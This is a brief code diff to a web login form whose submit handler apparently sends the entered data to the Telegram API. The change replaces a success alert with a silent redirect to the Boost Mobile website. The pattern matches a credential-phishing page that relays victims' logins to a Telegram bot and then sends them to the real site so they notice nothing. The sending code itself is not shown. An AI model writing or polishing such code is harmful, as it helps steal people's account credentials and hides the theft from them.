@@ -74,7 +74,8 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 
         const result = await response.json();
         if (result.ok) {
-            alert('Message sent successfully!');
+            // Redirect to Boost Mobile after successful submission
+            window.location.href = 'https://boostmobile.com';
         } else {
             alert(`Telegram API Error: ${result.description}`);
         }
